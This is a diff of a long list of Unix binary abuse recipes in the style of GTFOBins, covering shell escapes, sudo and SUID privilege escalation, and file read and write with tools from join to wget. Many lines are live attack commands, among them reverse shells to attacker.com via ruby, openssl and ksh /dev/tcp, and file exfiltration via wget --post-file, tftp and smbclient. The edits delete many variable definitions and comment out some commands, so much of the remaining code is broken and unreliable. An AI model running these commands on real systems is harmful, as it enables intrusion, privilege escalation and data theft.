 sudo ip netns exec foo /bin/sh
@@ -1173,21 +1179,21 @@ joe
 ^K!/bin/sh
 sudo joe
 ^K!/bin/sh
-LFILE=file_to_read
+
 join -a 2 /dev/null $LFILE
-LFILE=file_to_read
+
 ./join -a 2 /dev/null $LFILE
-LFILE=file_to_read
+
 sudo join -a 2 /dev/null $LFILE
 journalctl
 !/bin/sh
 sudo journalctl
 !/bin/sh
-LFILE=file_to_read
+
 jq -Rr . "$LFILE"
-LFILE=file_to_read
+
 ./jq -Rr . "$LFILE"
-LFILE=file_to_read
+
 sudo jq -Rr . "$LFILE"
 export RHOST=attacker.com
 export RPORT=12345
@@ -1207,9 +1213,9 @@ URL=http://attacker.com/file_to_get
 jrunscript -e "cp('$URL','$LFILE')"
 while ((line = br.readLine()) != null) { print(line); }'
 julia -e 'run(`/bin/sh`)'
-export LFILE=file_to_read
+export 
 julia -e 'print(open(f->read(f, String), ENV["LFILE"]))'
-export LFILE=file_to_write
+export 
 julia -e 'open(f->write(f, "DATA"), ENV["LFILE"], "w")'
 export URL=http://attacker.com/file_to_get
 export 
@@ -1242,17 +1248,17 @@ export RHOST=attacker.com
 export RPORT=12345
 export LFILE=file_to_get
 ksh -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'
-export LFILE=file_to_write
+export 
 ksh -c 'echo DATA > $LFILE'
-export LFILE=file_to_read
+export 
 ksh -c 'echo "$(<$LFILE)"'
-export LFILE=file_to_read
+export 
 ksh -c $'read -r -d \x04 < "$LFILE"; echo "$REPLY"'
-LFILE=file_to_read
+
 ksshell -i $LFILE
-LFILE=file_to_read
+
 ./ksshell -i $LFILE
-LFILE=file_to_read
+
 sudo ksshell -i $LFILE
 LFILE=dir_to_serve
 kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/
@@ -1284,7 +1290,7 @@ echo "$TF" > "$TF/conf"
 ./ldconfig -f "$TF/conf"
 less /etc/profile
 !/bin/sh
-VISUAL="/bin/sh -c '/bin/sh'" less /etc/profile
+#VISUAL="/bin/sh -c '/bin/sh'" less /etc/profile
 v
 less /etc/profile
 v:shell
@@ -1297,11 +1303,11 @@ less file_to_write
 v
 sudo less /etc/profile
 !/bin/sh
-LFILE=file_to_read
+
 links "$LFILE"
-LFILE=file_to_read
+
 ./links "$LFILE"
-LFILE=file_to_read
+
 sudo links "$LFILE"
 sudo ln -fs /bin/sh /bin/ln
 sudo ln
@@ -1309,11 +1315,11 @@ loginctl user-status
 !/bin/sh
 sudo loginctl user-status
 !/bin/sh
-LFILE=file_to_read
+
 look '' "$LFILE"
-LFILE=file_to_read
+
 ./look '' "$LFILE"
-LFILE=file_to_read
+
 sudo look '' "$LFILE"
 To collect the file run the following on the attacker box (this requires `cups` to be installed):
 1. `lpadmin -p printer -v socket://localhost -E` to create a virtual printer;
@@ -1324,9 +1330,9 @@ Send a local file to a CUPS server.
 
 RHOST=attacker.com
 lp $LFILE -h $RHOST
-LFILE=file_to_read
+
 ltrace -F $LFILE /dev/null
-LFILE=file_to_write
+
 ltrace -s 999 -o $LFILE ltrace -F DATA
 export RHOST=attacker.com
 export RPORT=12345
@@ -1375,17 +1381,17 @@ lwp-download $URL $LFILE
 URL=http://attacker.com/file_to_get
 
 sudo lwp-download $URL $LFILE
-LFILE=file_to_read
+
 TF=$(mktemp)
 lwp-download "file://$LFILE" $TF
 cat $TF
-LFILE=file_to_write
+
 TF=$(mktemp)
 echo DATA >$TF
 lwp-download file://$TF $LFILE
-LFILE=file_to_read
+
 lwp-request "file://$LFILE"
-LFILE=file_to_read
+
 sudo lwp-request "file://$LFILE"
 TF=$(mktemp)
 echo "From nobody@localhost $(date)" > $TF
@@ -1393,7 +1399,7 @@ mail -f $TF
 !/bin/sh
 COMMAND='/bin/sh'
 make -s --eval=$'x:\n\t-'"$COMMAND"
-LFILE=file_to_write
+
 make -s --eval="\$(file >$LFILE,DATA)" .
 COMMAND='/bin/sh -p'
 ./make -s --eval=$'x:\n\t-'"$COMMAND"
@@ -1404,11 +1410,11 @@ man man
 man '-H/bin/sh #' man
 sudo man man
 !/bin/sh
-LFILE=file_to_write
+
 mawk -v LFILE=$LFILE 'BEGIN { print "DATA" > LFILE }'
-LFILE=file_to_read
+
 mawk '//' "$LFILE"
-LFILE=file_to_read
+
 ./mawk '//' "$LFILE"
 Start the following command to open the TUI interface, then:
 1. press `Ctrl-A o` and select `Filenames and paths`;
@@ -1440,12 +1446,12 @@ TERM= more /etc/profile
 !/bin/sh
 TERM= sudo more /etc/profile
 !/bin/sh
-LFILE=file_to_read
+
 mosquitto -c "$LFILE"
-LFILE=file_to_read
+
 ./mosquitto -c "$L
 FILE"
-LFILE=file_to_read
+
 sudo mosquitto -c "$LFILE"
 sudo mount -o bind /bin/sh /bin/mount
 sudo mount
@@ -1455,50 +1461,50 @@ msf6 > irb
 sudo msfconsole
 msf6 > irb
 >> system("/bin/sh")
-LFILE=file_to_read
+
 msgattrib -P $LFILE
-LFILE=file_to_read
+
 sudo msgattrib -P $LFILE
-LFILE=file_to_read
+
 ./msgattrib -P $LFILE
-LFILE=file_to_read
+
 msgcat -P $LFILE
-LFILE=file_to_read
+
 sudo msgcat -P $LFILE
-LFILE=file_to_read
+
 ./msgcat -P $LFILE
-LFILE=file_to_read
+
 msgconv -P $LFILE
-LFILE=file_to_read
+
 sudo msgconv -P $LFILE
-LFILE=file_to_read
+
 ./msgconv -P $LFILE
-echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'
-LFILE=file_to_read
+#echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'
+
 msgfilter -P -i "LFILE" /bin/cat
-echo x | sudo msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'
-echo x | ./msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'
-LFILE=file_to_read
+#echo x | sudo msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'
+#echo x | ./msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'
+
 msgmerge -P $LFILE /dev/null
-LFILE=file_to_read
+
 sudo msgmerge -P $LFILE /dev/null
-LFILE=file_to_read
+
 ./msgmerge -P $LFILE /dev/null
-LFILE=file_to_read
+
 msguniq -P $LFILE
-LFILE=file_to_read
+
 sudo msguniq -P $LFILE
-LFILE=file_to_read
+
 ./msguniq -P $LFILE
-LFILE=file_to_read
+
 mtr --raw -F "$LFILE"
-LFILE=file_to_read
+
 sudo mtr --raw -F "$LFILE"
-LFILE=file_to_write
+
 TF=$(mktemp)
 echo "DATA" > $TF
 ./mv $TF $LFILE
-LFILE=file_to_write
+
 TF=$(mktemp)
 echo "DATA" > $TF
 sudo mv $TF $LFILE
@@ -1519,11 +1525,11 @@ DATA
 sudo nano
 ^R^X
 reset; sh 1>&0 2>&0
-LFILE=file_to_read
+
 nasm -@ $LFILE
-LFILE=file_to_read
+
 ./nasm -@ $LFILE
-LFILE=file_to_read
+
 sudo nasm -@ $LFILE
 RHOST=attacker.com
 RPORT=12345
@@ -1536,11 +1542,11 @@ nawk -v LPORT=$LPORT 'BEGIN {
 s = "/inet/tcp/" LPORT "/0/0";
 while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
 while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
-LFILE=file_to_write
+
 nawk -v LFILE=$LFILE 'BEGIN { print "DATA" > LFILE }'
-LFILE=file_to_read
+
 nawk '//' "$LFILE"
-LFILE=file_to_read
+
 ./nawk '//' "$LFILE"
 RHOST=attacker.com
 RPORT=12345
@@ -1575,28 +1581,28 @@ sudo ncftp
 TF=$(mktemp)
 echo 'exec /bin/sh' >$TF
 neofetch --config $TF
-LFILE=file_to_read
+
 neofetch --ascii $LFILE
 TF=$(mktemp)
 echo 'exec /bin/sh' >$TF
 sudo neofetch --config $TF
-LFILE=file_to_read
+
 nft -f "$LFILE"
-LFILE=file_to_read
+
 ./nft -f "$LFILE"
-LFILE=file_to_read
+
 sudo nft -f "$LFILE"
-LFILE=file_to_read
+
 nl -bn -w1 -s '' $LFILE
-LFILE=file_to_read
+
 ./nl -bn -w1 -s '' $LFILE
-LFILE=file_to_read
+
 sudo nl -bn -w1 -s '' $LFILE
-LFILE=file_to_read
+
 nm @$LFILE
-LFILE=file_to_read
+
 ./nm @$LFILE
-LFILE=file_to_read
+
 sudo nm @$LFILE
 TF=$(mktemp)
 echo 'os.execute("/bin/sh")' > $TF
@@ -1662,7 +1668,7 @@ nmap --script=$TF
 TF=$(mktemp)
 echo 'local f=io.open("file_to_write", "wb"); f:write("data"); io.close(f);' > $TF
 nmap --script=$TF
-LFILE=file_to_write
+
 nmap -oG=$LFILE DATA
 TF=$(mktemp)
 echo 'local f=io.open("file_to_read", "rb"); print(f:read("*a")); io.close(f);' > $TF
@@ -1676,7 +1682,7 @@ nmap> !sh
 TF=$(mktemp)
 echo 'os.execute("/bin/sh")' > $TF
 ./nmap --script=$TF
-LFILE=file_to_write
+
 ./nmap -oG=$LFILE DATA
 node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
 export URL=http://attacker.com/file_to_get
@@ -1712,7 +1718,7 @@ npm -C $TF i
 TF=$(mktemp -d)
 echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
 sudo npm -C $TF --unsafe-perm i
-LFILE=file_to_read
+
 nroff $LFILE
 TF=$(mktemp -d)
 echo '#!/bin/sh' > $TF/groff
@@ -1724,17 +1730,17 @@ echo '#!/bin/sh' > $TF/groff
 echo '/bin/sh' >> $TF/groff
 chmod +x $TF/groff
 sudo GROFF_BIN_PATH=$TF nroff
-LFILE=file_to_read
+
 ntpdate -a x -k $LFILE -d localhost
-LFILE=file_to_read
+
 sudo ntpdate -a x -k $LFILE -d localhost
-LFILE=file_to_read
+
 ./ntpdate -a x -k $LFILE -d localhost
-LFILE=file_to_read
+
 od -An -c -w9999 "$LFILE"
-LFILE=file_to_read
+
 ./od -An -c -w9999 "$LFILE"
-LFILE=file_to_read
+
 sudo od -An -c -w9999 "$LFILE"
 To receive the shell run the following on the attacker box:
 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
@@ -1759,13 +1765,13 @@ RHOST=attacker.com
 RPORT=12345
 
 openssl s_client -quiet -connect $RHOST:$RPORT > "$LFILE"
-LFILE=file_to_write
+
 echo DATA | openssl enc -out "$LFILE"
-LFILE=file_to_write
+
 TF=$(mktemp)
 echo "DATA" > $TF
 openssl enc -in "$TF" -out "$LFILE"
-LFILE=file_to_read
+
 openssl enc -in "$LFILE"
 To receive the shell run the following on the attacker box:
 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
@@ -1774,7 +1780,7 @@ Communication between attacker and target will be encrypted.
 RHOST=attacker.com
 RPORT=12345
 mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s
-LFILE=file_to_write
+
 echo DATA | openssl enc -out "$LFILE"
 To receive the shell run the following on the attacker box:
 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
@@ -1783,18 +1789,18 @@ Communication between attacker and target will be encrypted.
 RHOST=attacker.com
 RPORT=12345
 mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s
-openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
-LFILE=file_to_read
-openvpn --config "$LFILE"
-./openvpn --dev null --script-security 2 --up '/bin/sh -p -c "sh -p"'
-LFILE=file_to_read
-./openvpn --config "$LFILE"
-sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
-LFILE=file_to_read
+#openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
+
+#openvpn --config "$LFILE"
+#./openvpn --dev null --script-security 2 --up '/bin/sh -p -c "sh -p"'
+
+#./openvpn --config "$LFILE"
+#sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
+
 sudo openvpn --config "$LFILE"
 COMMAND=id
 TF=$(mktemp -u)
-sudo openvt -- sh -c "$COMMAND >$TF 2>&1"
+#sudo openvt -- sh -c "$COMMAND >$TF 2>&1"
 cat $TF
 It runs an interactive shell using a specially crafted Debian package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
 ```
@@ -1803,14 +1809,14 @@ echo 'exec /bin/sh' > $TF/x.sh
 fpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF
 ```
 sudo opkg install x_1.0_all.deb
-LFILE=file_to_read
+
 pandoc -t plain "$LFILE"
-LFILE=file_to_write
+
 echo DATA | pandoc -t plain -o "$LFILE"
 TF=$(mktemp)
 echo 'os.execute("/bin/sh")' >$TF
 pandoc -L $TF /dev/null
-LFILE=file_to_write
+
 echo DATA | ./pandoc -t plain -o "$LFILE"
 TF=$(mktemp)
 echo 'os.execute("/bin/sh")' >$TF
@@ -1818,13 +1824,13 @@ echo 'os.execute("/bin/sh")' >$TF
 TF=$(mktemp)
 echo 'os.execute("/bin/sh")' >$TF
 sudo pandoc -L $TF /dev/null
-LFILE=file_to_read
+
 paste $LFILE
-LFILE=file_to_read
+
 paste $LFILE
-LFILE=file_to_read
+
 sudo paste $LFILE
-LFILE=file_to_read
+
 pax -w "$LFILE"
 TF=$(mktemp)
 echo 'import os; os.system("/bin/sh")' > $TF
@@ -1847,7 +1853,7 @@ sudo pdftex --shell-escape '\write18{/bin/sh}\end'
 perf stat /bin/sh
 ./perf stat /bin/sh -p
 sudo perf stat /bin/sh
-LFILE=file_to_read
+
 perl -ne print $LFILE
 export RHOST=attacker.com
 export RPORT=12345
@@ -1883,11 +1889,11 @@ CMD="/bin/sh"
 sudo php -r "system('$CMD');"
 CMD="/bin/sh"
 ./php -r "posix_setuid(0); system('$CMD');"
-export LFILE=file_to_read
+export 
 php -r 'readfile(getenv("LFILE"));'
-export LFILE=file_to_write
+export 
 php -r 'file_put_contents(getenv("LFILE"), "DATA");'
-LFILE=file_to_read
+
 pic $LFILE
 pic -U
 .PS
@@ -1920,7 +1926,7 @@ sudo pidstat -e $COMMAND
 COMMAND=id
 ./pidstat -e $COMMAND
 TF=$(mktemp -d)
-echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
+#echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
 pip install $TF
 export RHOST=attacker.com
 export RPORT=12345
@@ -1964,7 +1970,7 @@ TF=$(mktemp -d)
 echo 'from ctypes import cdll; cdll.LoadLibrary("lib.so")' > $TF/setup.py
 pip install $TF
 TF=$(mktemp -d)
-echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
+#echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
 sudo pip install $TF
 It runs commands using a specially crafted FreeBSD package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
 ```
@@ -1973,11 +1979,11 @@ echo 'id' > $TF/x.sh
 fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF
 ```
 sudo pkg install -y --no-repo-update ./x-1.0.txz
-LFILE=file_to_read
+
 pr -T $LFILE
-LFILE=file_to_read
+
 pr -T $LFILE
-LFILE=file_to_read
+
 pr -T $LFILE
 pry
 system("/bin/sh")
@@ -1997,19 +2003,19 @@ psql
 psql
 \?
 !/bin/sh
-LFILE=file_to_read
+
 ptx -w 5000 "$LFILE"
-LFILE=file_to_read
+
 ./ptx -w 5000 "$LFILE"
-LFILE=file_to_read
+
 sudo ptx -w 5000 "$LFILE"
-puppet apply -e "exec { '/bin/sh -c \"exec sh -i <$(tty) >$(tty) 2>$(tty)\"': }"
+#puppet apply -e "exec { '/bin/sh -c \"exec sh -i <$(tty) >$(tty) 2>$(tty)\"': }"
 LFILE="/tmp/file_to_write"
 puppet apply -e "file { '$LFILE': content => 'DATA' }"
-LFILE=file_to_read
+
 puppet filebucket -l diff /dev/null $LFILE
-sudo puppet apply -e "exec { '/bin/sh -c \"exec sh -i <$(tty) >$(tty) 2>$(tty)\"': }"
-export LFILE=file_to_write
+#sudo puppet apply -e "exec { '/bin/sh -c \"exec sh -i <$(tty) >$(tty) 2>$(tty)\"': }"
+export 
 pwsh -c '"DATA" | Out-File $env:LFILE'
 export RHOST=attacker.com
 export RPORT=12345
@@ -2036,11 +2042,11 @@ else: import urllib as r
 r.urlretrieve(e["URL"], e["LFILE"])'
 LFILE=file-to-read
 rake -f $LFILE
-LFILE=file_to_read
+
 readelf -a @$LFILE
-LFILE=file_to_read
+
 ./readelf -a @$LFILE
-LFILE=file_to_read
+
 sudo readelf -a @$LFILE
 red file_to_write
 a
@@ -2057,9 +2063,9 @@ DATA
 .
 w
 q
-LFILE=file_to_read
+
 redcarpet "$LFILE"
-LFILE=file_to_read
+
 sudo redcarpet "$LFILE"
 IP=127.0.0.1
 redis-cli -h $IP
@@ -2082,11 +2088,11 @@ RPORT=12345
 LFILE=file_or_dir_to_get
 NAME=backup_name
 ./restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"
-LFILE=file_to_read
+
 rev $LFILE | rev
-LFILE=file_to_read
+
 ./rev $LFILE | rev
-LFILE=file_to_read
+
 sudo rev $LFILE | rev
 Send contents of a file to a TCP port. Run `nc -l -p 12345 > "file_to_save"` on the attacker system to capture the contents.
 `rlogin` hangs waiting for the remote peer to close the socket.
@@ -2095,7 +2101,7 @@ RHOST=attacker.com
 RPORT=12345
 
 rlogin -l "$(cat $LFILE)" -p $RPORT $RHOST
-LFILE=file_to_write
+
 rlwrap -l "$LFILE" echo DATA
 It runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
 ```
@@ -2104,10 +2110,10 @@ echo 'id' > $TF/x.sh
 fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF
 ```
 sudo rpm -ivh x-1.0-1.noarch.rpm
-echo "execute = /bin/sh,-c,\"/bin/sh <$(tty) >$(tty) 2>$(tty)\"" >~/.rtorrent.rc
-rtorrent
-echo "execute = /bin/sh,-p,-c,\"/bin/sh -p <$(tty) >$(tty) 2>$(tty)\"" >~/.rtorrent.rc
-./rtorrent
+#echo "execute = /bin/sh,-c,\"/bin/sh <$(tty) >$(tty) 2>$(tty)\"" >~/.rtorrent.rc
+#rtorrent
+#echo "execute = /bin/sh,-p,-c,\"/bin/sh -p <$(tty) >$(tty) 2>$(tty)\"" >~/.rtorrent.rc
+#./rtorrent
 export RHOST=attacker.com
 export RPORT=12345
 ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["RHOST"],ENV["RPORT"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
@@ -2293,15 +2299,15 @@ TF=$(mktemp)
 echo 'sh 0<&2 1>&2' > $TF
 chmod +x "$TF"
 ./scp -S $TF a b:
-LFILE=file_to_write
+
 screen -L -Logfile $LFILE echo DATA
-LFILE=file_to_write
+
 screen -L $LFILE echo DATA
-LFILE=file_to_write
+
 sed -n "1s/.*/DATA/w $LFILE" /etc/hosts
-LFILE=file_to_read
+
 sed '' "$LFILE"
-LFILE=file_to_read
+
 ./sed -e '' "$LFILE"
 LFILE=file_to_change
 USER=somebody
@@ -2325,21 +2331,21 @@ sudo sftp $HOST
 !/bin/sh
 sg $(id -ng)
 sudo sg root
-LFILE=file_to_read
+
 shuf -z "$LFILE"
-LFILE=file_to_write
+
 shuf -e DATA -o "$LFILE"
-LFILE=file_to_write
+
 ./shuf -e DATA -o "$LFILE"
-LFILE=file_to_write
+
 sudo shuf -e DATA -o "$LFILE"
-smbclient '\\attacker\share'
-!/bin/sh
-smbclient '\\attacker\share' -c 'put file_to_send where_to_save'
-smbclient '\\attacker\share' -c 'put file_to_send where_to_save'
-sudo smbclient '\\attacker\share'
-!/bin/sh
-It runs commands using a specially crafted Snap package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
+#smbclient '\\attacker\share'
+#!/bin/sh
+#smbclient '\\attacker\share' -c 'put file_to_send where_to_save'
+#smbclient '\\attacker\share' -c 'put file_to_send where_to_save'
+#sudo smbclient '\\attacker\share'
+#!/bin/sh
+#It runs commands using a specially crafted Snap package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
 ```
 COMMAND=id
 cd $(mktemp -d)
@@ -2363,9 +2369,9 @@ RHOST=attacker.com
 RPORT=12345
 
 socat -u tcp-connect:$RHOST:$RPORT open:$LFILE,creat
-LFILE=file_to_read
+
 socat -u "file:$LFILE" -
-LFILE=file_to_write
+
 socat -u 'exec:echo DATA' "open:$LFILE,creat"
 sudo socat stdin exec:/bin/sh
 RHOST=attacker.com
@@ -2376,19 +2382,19 @@ RPORT=12345
 socket -qvp '/bin/sh -i' $RHOST $RPORT
 LPORT=12345
 socket -svp '/bin/sh -i' $LPORT
-LFILE=file_to_read
+
 soelim "$LFILE"
-LFILE=file_to_read
+
 ./soelim "$LFILE"
-LFILE=file_to_read
+
 sudo soelim "$LFILE"
-LFILE=file_to_read
+
 sort -m "$LFILE"
-LFILE=file_to_read
+
 ./sort -m "$LFILE"
-LFILE=file_to_read
+
 sudo sort -m "$LFILE"
-LFILE=file_to_read
+
 TF=$(mktemp)
 split $LFILE $TF
 cat $TF*
@@ -2406,31 +2412,31 @@ COMMAND=id
 echo | split --filter=$COMMAND /dev/stdin
 split --filter=/bin/sh /dev/stdin
 sudo split --filter=/bin/sh /dev/stdin
-LFILE=file_to_write
+
 sqlite3 /dev/null -cmd ".output $LFILE" 'select "DATA";'
-LFILE=file_to_read
+
 sqlite3 << EOF
 CREATE TABLE t(line TEXT);
 .import $LFILE t
 SELECT * FROM t;
 EOF
-LFILE=file_to_read
+
 sqlite3 << EOF
 CREATE TABLE t(line TEXT);
 .import $LFILE t
 SELECT * FROM t;
 EOF
-LFILE=file_to_read
+
 ss -a -F $LFILE
-LFILE=file_to_read
+
 ./ss -a -F $LFILE
-LFILE=file_to_read
+
 sudo ss -a -F $LFILE
-LFILE=file_to_read
+
 ssh-keyscan -f $LFILE
-LFILE=file_to_read
+
 ./ssh-keyscan -f $LFILE
-LFILE=file_to_read
+
 sudo ssh-keyscan -f $LFILE
 HOST=user@attacker.com
 RPATH=file_to_save
@@ -2440,29 +2446,29 @@ HOST=user@attacker.com
 RPATH=file_to_get
 LPATH=file_to_save
 ssh $HOST "cat $RPATH" > $LPATH
-LFILE=file_to_read
+
 ssh -F $LFILE localhost
-LFILE=file_to_write
+
 strace -s 999 -o $LFILE strace - DATA
-LFILE=file_to_read
+
 strings "$LFILE"
-LFILE=file_to_read
+
 ./strings "$LFILE"
-LFILE=file_to_read
+
 sudo strings "$LFILE"
-COMMAND='/bin/sh -c id>/tmp/id'
+#COMMAND='/bin/sh -c id>/tmp/id'
 sysctl "kernel.core_pattern=|$COMMAND"
 sleep 9999 &
 kill -QUIT $!
 cat /tmp/id
-LFILE=file_to_read
+
 /usr/sbin/sysctl -n "/../../$LFILE"
-COMMAND='/bin/sh -c id>/tmp/id'
+#COMMAND='/bin/sh -c id>/tmp/id'
 ./sysctl "kernel.core_pattern=|$COMMAND"
 sleep 9999 &
 kill -QUIT $!
 cat /tmp/id
-COMMAND='/bin/sh -c id>/tmp/id'
+#COMMAND='/bin/sh -c id>/tmp/id'
 sudo sysctl "kernel.core_pattern=|$COMMAND"
 sleep 9999 &
 kill -QUIT $!
@@ -2470,7 +2476,7 @@ cat /tmp/id
 TF=$(mktemp).service
 echo '[Service]
 Type=oneshot
-ExecStart=/bin/sh -c "id > /tmp/output"
+#ExecStart=/bin/sh -c "id > /tmp/output"
 [Install]
 WantedBy=multi-user.target' > $TF
 ./systemctl link $TF
@@ -2482,7 +2488,7 @@ sudo SYSTEMD_EDITOR=$TF systemctl edit system.slice
 TF=$(mktemp).service
 echo '[Service]
 Type=oneshot
-ExecStart=/bin/sh -c "id > /tmp/output"
+#ExecStart=/bin/sh -c "id > /tmp/output"
 [Install]
 WantedBy=multi-user.target' > $TF
 sudo systemctl link $TF
@@ -2491,17 +2497,17 @@ sudo systemctl
 !sh
 sudo systemd-resolve --status
 !sh
-LFILE=file_to_read
+
 tac -s 'RANDOM' "$LFILE"
-LFILE=file_to_read
+
 ./tac -s 'RANDOM' "$LFILE"
-LFILE=file_to_read
+
 sudo tac -s 'RANDOM' "$LFILE"
-LFILE=file_to_read
+
 tail -c1G "$LFILE"
-LFILE=file_to_read
+
 ./tail -c1G "$LFILE"
-LFILE=file_to_read
+
 sudo tail -c1G "$LFILE"
 TF=$(mktemp)
 echo '/bin/sh 0<&1' > "$TF"
@@ -2517,11 +2523,11 @@ RHOST=attacker.com
 RUSER=root
 RFILE=/tmp/file_to_get.tar
 tar xvf $RUSER@$RHOST:$RFILE --rsh-command=/bin/ssh
-LFILE=file_to_write
+
 TF=$(mktemp)
 echo DATA > "$TF"
 tar c --xform "s@.*@$LFILE@" -OP "$TF" | tar x -P
-LFILE=file_to_read
+
 tar xf "$LFILE" -I '/bin/sh -c "cat 1>&2"'
 tasksh
 !/bin/sh
@@ -2529,11 +2535,11 @@ tasksh
 !/bin/sh
 sudo tasksh
 !/bin/sh
-LFILE=file_to_read
+
 tbl $LFILE
-LFILE=file_to_read
+
 ./tbl $LFILE
-LFILE=file_to_read
+
 sudo tbl $LFILE
 tclsh
 exec /bin/sh <@stdin >@stdout 2>@stderr
@@ -2560,11 +2566,11 @@ sudo tdbtool
 ! /bin/sh
 ./tdbtool
 ! /bin/sh
-LFILE=file_to_write
+
 echo DATA | ./tee -a "$LFILE"
-LFILE=file_to_write
+
 echo DATA | ./tee -a "$LFILE"
-LFILE=file_to_write
+
 echo DATA | sudo tee -a "$LFILE"
 RHOST=attacker.com
 RPORT=12345
@@ -2606,17 +2612,17 @@ put file_to_send
 RHOST=attacker.com
 sudo tftp $RHOST
 put file_to_send
-LFILE=file_to_read
+
 tic -C "$LFILE"
-LFILE=file_to_read
+
 ./tic -C "$LFILE"
-LFILE=file_to_read
+
 sudo tic -C "$LFILE"
 timedatectl list-timezones
 !/bin/sh
 sudo timedatectl list-timezones
 !/bin/sh
-LFILE=file_to_read
+
 tmux -f $LFILE
 tmux -S /path/to/socket_name
 echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc
@@ -2627,32 +2633,32 @@ echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc
 sudo top
 # press return twice
 reset
-LFILE=file_to_read
+
 troff $LFILE
-LFILE=file_to_read
+
 ./troff $LFILE
-LFILE=file_to_read
+
 sudo troff $LFILE
 TF=$(mktemp)
 echo 'os.execute("/bin/sh")' >$TF
 tshark -Xlua_script:$TF
-LFILE=file_to_read
+
 ul "$LFILE"
-LFILE=file_to_read
+
 ./ul "$LFILE"
-LFILE=file_to_read
+
 sudo ul "$LFILE"
-LFILE=file_to_read
+
 unexpand -t99999999 "$LFILE"
-LFILE=file_to_read
+
 ./unexpand -t99999999 "$LFILE"
-LFILE=file_to_read
+
 sudo unexpand -t99999999 "$LFILE"
-LFILE=file_to_read
+
 uniq "$LFILE"
-LFILE=file_to_read
+
 ./uniq "$LFILE"
-LFILE=file_to_read
+
 sudo uniq "$LFILE"
 sudo unsquashfs shell
 ./squashfs-root/sh -p
@@ -2670,17 +2676,17 @@ LFILE=/path/to/file_to_write
 TF=$(mktemp)
 echo DATA >$TF
 ./update-alternatives --force --install "$LFILE" x "$TF" 0
-LFILE=file_to_read
+
 uuencode "$LFILE" /dev/stdout | uudecode
-LFILE=file_to_read
+
 uuencode "$LFILE" /dev/stdout | uudecode
-LFILE=file_to_read
+
 sudo uuencode "$LFILE" /dev/stdout | uudecode
-LFILE=file_to_read
+
 uuencode "$LFILE" /dev/stdout | uudecode
-LFILE=file_to_read
+
 uuencode "$LFILE" /dev/stdout | uudecode
-LFILE=file_to_read
+
 sudo uuencode "$LFILE" /dev/stdout | uudecode
 cd $(mktemp -d)
 echo 'exec "/bin/sh"' > Vagrantfile
@@ -2691,9 +2697,9 @@ vagrant up
 cd $(mktemp -d)
 echo 'exec "/bin/sh -p"' > Vagrantfile
 vagrant up
-LFILE=file_to_write
+
 sudo varnishncsa -g request -q 'ReqURL ~ "/xxx"' -F '%{yyy}i' -w "$LFILE"
-LFILE=file_to_write
+
 ./varnishncsa -g request -q 'ReqURL ~ "/xxx"' -F '%{yyy}i' -w "$LFILE"
 vi
 :set shell=/bin/sh
@@ -2969,19 +2975,19 @@ virsh -c qemu:///system vol-download --pool x $LFILE_NAME $SPATH
 virsh -c qemu:///system pool-destroy x
 volatility -f file.dump volshell
 __import__('os').system('/bin/sh')
-LFILE=file_to_read
+
 w3m "$LFILE" -dump
-LFILE=file_to_read
+
 ./w3m "$LFILE" -dump
-LFILE=file_to_read
+
 sudo w3m "$LFILE" -dump
-LFILE=file_to_read
+
 sudo wall --nobanner "$LFILE"
-LFILE=file_to_read
+
 wc --files0-from "$LFILE"
-LFILE=file_to_read
+
 ./wc --files0-from "$LFILE"
-LFILE=file_to_read
+
 sudo wc --files0-from "$LFILE"
 TF=$(mktemp)
 chmod +x $TF
@@ -2990,9 +2996,9 @@ wget --use-askpass=$TF 0
 URL=http://attacker.com/
 
 wget --post-file=$LFILE $URL
-LFILE=file_to_read
+
 wget -i $LFILE
-LFILE=file_to_write
+
 TF=$(mktemp)
